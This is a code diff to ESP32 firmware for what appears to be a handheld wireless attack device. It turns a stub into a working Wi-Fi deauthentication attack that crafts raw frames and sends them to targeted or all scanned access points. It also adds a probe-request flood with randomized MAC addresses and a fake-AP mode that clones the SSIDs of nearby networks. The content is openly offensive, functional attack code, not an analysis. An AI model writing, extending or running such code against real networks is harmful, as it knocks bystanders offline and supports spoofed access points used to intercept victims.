@@ -5,9 +5,13 @@
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "esp_log.h"
+#include "esp_random.h"
+#include "esp_timer.h"
 #include "esp_wifi.h"
+#include "recon.h"
 #include <stdint.h>
 #include <stdio.h>
+#include <string.h>
 
 static const char *TAG = "ACTIONS";
 
@@ -16,6 +20,13 @@ static velo_settings_t *s_settings = NULL;
 static TaskHandle_t g_action_task = NULL;
 static volatile bool g_kill_action = false;
 static action_t g_current_action = ACTION_NONE;
+
+/* attack target (set from the UI before starting an action) */
+static uint8_t s_target_ap[6] = {0};
+static uint8_t s_target_client[6] = {0};
+
+/* counters (reset when an action starts) */
+static action_counters_t s_counters = {0};
 
 void actions_set_settings(velo_settings_t *s) { s_settings = s; }
 
@@ -27,39 +38,208 @@ const char *actions_name(action_t a) {
         return "BLE Spam";
     case ACTION_FAKE_AP:
         return "Fake AP";
+    case ACTION_RECON:
+        return "WiFi Scan";
+    case ACTION_BLE_SCAN:
+        return "BLE Scan";
+    case ACTION_PROBE_FLOOD:
+        return "Probe Flood";
     default:
         return "None";
     }
 }
 
 bool actions_is_running(void) { return g_action_task != NULL; }
-
 action_t actions_current(void) { return g_current_action; }
+
+void actions_set_target(const uint8_t ap_bssid[6], const uint8_t client[6]) {
+    if (ap_bssid) {
+        memcpy(s_target_ap, ap_bssid, 6);
+    }
+    if (client) {
+        memcpy(s_target_client, client, 6);
+    } else {
+        memset(s_target_client, 0, 6);
+    }
+}
+
+void actions_clear_target(void) {
+    memset(s_target_ap, 0, 6);
+    memset(s_target_client, 0, 6);
+}
+
+action_counters_t actions_counters(void) { return s_counters; }
+
+/* reusable buffers so the action task doesn't blow the 4K stack */
+static char s_fakeap_ssids[64][33];
+static uint32_t s_fakeap_ssid_count = 0;
+
+/* important: g_kill_action reset per start */
+static bool mac_zero(const uint8_t m[6]) {
+    return m[0] == 0 && m[1] == 0 && m[2] == 0 && m[3] == 0 && m[4] == 0 &&
+           m[5] == 0;
+}
+
+/* ------------------------------------------------------------------ */
+/*  Frame builders                                                    */
+/* ------------------------------------------------------------------ */
+
+static int build_deauth_frame(uint8_t *out, const uint8_t bssid[6],
+                              const uint8_t dest[6]) {
+    memset(out, 0, 26);
+    out[0] = 0x00;
+    out[1] = 0xC0; /* FC subtype deauth */
+    memcpy(&out[4], dest, 6);  /* addr1: RA (destination) */
+    memcpy(&out[10], bssid, 6); /* addr2: TA (the real AP) */
+    memcpy(&out[16], bssid, 6); /* addr3: BSSID */
+    out[24] = 0x07; /* reason class 3 from non-associated STA */
+    out[25] = 0x00;
+    return 26;
+}
+
+static int build_probe_req(uint8_t *out, const char *ssid, uint8_t ssid_len,
+                           uint8_t channel) {
+    memset(out, 0, 50);
+    out[0] = 0x40; /* type=0 subtype=4 probe request */
+    out[1] = 0x00;
+    memset(&out[4], 0xFF, 6); /* DA broadcast */
+
+    uint8_t mac[6];
+    esp_fill_random(mac, 6);
+    mac[0] = (mac[0] & 0xFC) | 0x02; /* locally administered */
+    memcpy(&out[10], mac, 6);        /* SA */
+
+    memset(&out[16], 0xFF, 6); /* BSSID broadcast */
+
+    int pos = 24;
+
+    /* tag 0: SSID */
+    out[pos] = 0;
+    out[pos + 1] = ssid_len;
+    pos += 2;
+    memcpy(&out[pos], ssid, ssid_len);
+    pos += ssid_len;
+
+    /* tag 1: supported rates */
+    out[pos] = 1;
+    out[pos + 1] = 8;
+    pos += 2;
+    static const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96,
+                                    0x24, 0x30, 0x48, 0x6c};
+    memcpy(&out[pos], rates, 8);
+    pos += 8;
+
+    /* tag 3: DS parameter set */
+    out[pos] = 3;
+    out[pos + 1] = 1;
+    out[pos + 2] = channel;
+    pos += 3;
+
+    return pos;
+}
+
+static void tx_deauth(const uint8_t bssid[6], const uint8_t client[6]) {
+    uint8_t frame[32];
+    int len = build_deauth_frame(frame, bssid, client);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, (size_t)len, false);
+    s_counters.deauth_sent++;
+}
+
+static void tx_probe(const char *ssid, uint8_t ssid_len, uint8_t channel) {
+    uint8_t frame[56];
+    int len = build_probe_req(frame, ssid, ssid_len, channel);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, (size_t)len, false);
+    s_counters.probe_sent++;
+}
+
+/* ------------------------------------------------------------------ */
+/*  Channel utils                                                     */
+/* ------------------------------------------------------------------ */
+
+static uint8_t find_ap_channel(const uint8_t bssid[6]) {
+    recon_ap_t ap;
+    if (recon_get_ap(bssid, &ap)) {
+        return ap.channel ? ap.channel : 1;
+    }
+    return 1;
+}
+
+/* ------------------------------------------------------------------ */
+/*  Action task                                                       */
+/* ------------------------------------------------------------------ */
 
 static void action_task_wrapper(void *pvParameters) {
     action_t action = (action_t)(intptr_t)pvParameters;
+    memset(&s_counters, 0, sizeof(s_counters));
 
     switch (action) {
-    case ACTION_WIFI_DEAUTH:
-        ESP_LOGI(TAG, "WiFi deauth loop running");
-        while (!g_kill_action) {
-            // TODO: inject deauth frames here
-            vTaskDelay(pdMS_TO_TICKS(50));
-        }
-        break;
 
+    /* ---- WiFi Deauth ---- */
+    case ACTION_WIFI_DEAUTH: {
+        ESP_LOGI(TAG, "WiFi deauth starting");
+        if (!recon_start()) {
+            ESP_LOGE(TAG, "promiscuous failed, aborting deauth");
+            break;
+        }
+
+        while (!g_kill_action) {
+            /* targeted deauth */
+            if (!mac_zero(s_target_ap)) {
+                uint8_t ch = find_ap_channel(s_target_ap);
+                ap_set_channel(ch);
+                if (!mac_zero(s_target_client)) {
+                    tx_deauth(s_target_ap, s_target_client);
+                } else {
+                    tx_deauth(s_target_ap, (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
+                }
+                vTaskDelay(pdMS_TO_TICKS(20));
+                continue;
+            }
+
+            /* broadcast deauth on all scanned APs */
+            uint8_t bssids[32][6];
+            recon_lock();
+            uint32_t n = recon_core_aps(bssids, 32);
+            recon_unlock();
+
+            for (uint32_t i = 0; i < n && !g_kill_action; i++) {
+                ap_set_channel(find_ap_channel(bssids[i]));
+                tx_deauth(bssids[i], (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
+                vTaskDelay(pdMS_TO_TICKS(8));
+            }
+
+            if (n == 0) {
+                /* no scan data, hop and shout */
+                for (uint8_t ch = 1; ch <= 13 && !g_kill_action; ch++) {
+                    ap_set_channel(ch);
+                    uint8_t rand_bssid[6];
+                    esp_fill_random(rand_bssid, 6);
+                    rand_bssid[0] = (rand_bssid[0] & 0xFE) | 0x02;
+                    tx_deauth(rand_bssid, (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
+                    vTaskDelay(pdMS_TO_TICKS(20));
+                }
+            }
+        }
+
+        recon_stop();
+        break;
+    }
+
+    /* ---- BLE Spam ---- */
     case ACTION_BLE_SPAM:
         ESP_LOGI(TAG, "BLE kitchen-sink spam running");
         while (!g_kill_action) {
             ble_spam_kitchen_sink_run_once();
-            vTaskDelay(pdMS_TO_TICKS(150)); /* rotate payload every 150 ms */
+            vTaskDelay(pdMS_TO_TICKS(150));
         }
         ble_spam_stop();
         ESP_LOGI(TAG, "Stopping BLE spam sequence...");
         break;
 
+    /* ---- Fake AP (beacon spam) ---- */
     case ACTION_FAKE_AP: {
         ESP_LOGI(TAG, "Fake AP starting");
+        s_counters.beacon_sent = 0;
 
         ap_config_t config = {
             .SSID = {0},
@@ -72,29 +252,111 @@ static void action_task_wrapper(void *pvParameters) {
             config.MAX_CONNECTIONS = s_settings->fakeap_max_connections;
         }
         create_config(&config);
-
         ap_set_channel(config.WIFI_CHANNEL);
 
-        uint32_t ssid_count = 0;
+        s_fakeap_ssid_count = 0;
+
+        /* custom SSIDs from settings */
         if (s_settings) {
-            ssid_count = settings_ssid_count(s_settings);
+            uint32_t n = settings_ssid_count(s_settings);
+            if (n > 64) n = 64;
+            for (uint32_t i = 0; i < n; i++) {
+                settings_get_ssid(s_settings, i, s_fakeap_ssids[s_fakeap_ssid_count], 33);
+                s_fakeap_ssid_count++;
+            }
         }
 
+        /* cloned APs from the scan table */
+        recon_lock();
+        uint32_t clone_n = recon_core_ssids(
+            &s_fakeap_ssids[s_fakeap_ssid_count],
+            64 - s_fakeap_ssid_count > 32 ? 32 : 64 - s_fakeap_ssid_count);
+        recon_unlock();
+        s_fakeap_ssid_count += clone_n;
+
         while (!g_kill_action) {
-            for (uint32_t i = 0; i < ssid_count; i++) {
-                if (g_kill_action) {
-                    break;
-                }
-                char ssid[SETTINGS_SSID_MAX_LEN];
-                settings_get_ssid(s_settings, i, ssid, sizeof(ssid));
-                ap_run(config, ssid);
+            for (uint32_t i = 0; i < s_fakeap_ssid_count && !g_kill_action; i++) {
+                ap_run(config, s_fakeap_ssids[i]);
+                s_counters.beacon_sent++;
                 vTaskDelay(pdMS_TO_TICKS(10));
             }
         }
 
         ESP_LOGI(TAG, "Stopping Fake AP sequence...");
         esp_wifi_stop();
-        ap_ensure_start(); /* bring the web AP back */
+        ap_ensure_start();
+        break;
+    }
+
+    /* ---- WiFi Scan (recon) ---- */
+    case ACTION_RECON:
+        ESP_LOGI(TAG, "WiFi recon starting");
+        recon_reset();
+        if (!recon_start()) {
+            ESP_LOGE(TAG, "promiscuous failed, aborting scan");
+            break;
+        }
+        while (!g_kill_action) {
+            recon_hop_once();
+        }
+        recon_stop();
+        ESP_LOGI(TAG, "WiFi scan stopped");
+        break;
+
+    /* ---- BLE Scan ---- */
+    case ACTION_BLE_SCAN:
+        ESP_LOGI(TAG, "BLE scan starting");
+        ble_scan_start();
+        while (!g_kill_action) {
+            vTaskDelay(pdMS_TO_TICKS(200));
+        }
+        ble_scan_stop();
+        ESP_LOGI(TAG, "BLE scan stopped");
+        break;
+
+    /* ---- Probe request flood ---- */
+    case ACTION_PROBE_FLOOD: {
+        ESP_LOGI(TAG, "probe flood starting");
+        if (!recon_start()) {
+            ESP_LOGE(TAG, "promiscuous failed, aborting probe flood");
+            break;
+        }
+
+        s_fakeap_ssid_count = 0;
+        if (s_settings) {
+            uint32_t n = settings_ssid_count(s_settings);
+            if (n > 64) n = 64;
+            for (uint32_t i = 0; i < n; i++) {
+                settings_get_ssid(s_settings, i,
+                                  s_fakeap_ssids[s_fakeap_ssid_count], 33);
+                s_fakeap_ssid_count++;
+            }
+        }
+        recon_lock();
+        uint32_t cn = recon_core_ssids(
+            &s_fakeap_ssids[s_fakeap_ssid_count],
+            64 - s_fakeap_ssid_count > 32 ? 32 : 64 - s_fakeap_ssid_count);
+        recon_unlock();
+        s_fakeap_ssid_count += cn;
+
+        while (!g_kill_action) {
+            for (uint8_t ch = 1; ch <= 13 && !g_kill_action; ch++) {
+                ap_set_channel(ch);
+                for (uint32_t i = 0; i < s_fakeap_ssid_count && !g_kill_action;
+                     i++) {
+                    uint8_t n = (uint8_t)strlen(s_fakeap_ssids[i]);
+                    if (n > 32) n = 32;
+                    tx_probe(s_fakeap_ssids[i], n, ch);
+                    vTaskDelay(pdMS_TO_TICKS(15));
+                }
+                if (s_fakeap_ssid_count == 0) {
+                    tx_probe("", 0, ch);
+                    vTaskDelay(pdMS_TO_TICKS(15));
+                }
+            }
+        }
+
+        recon_stop();
         break;
     }
 
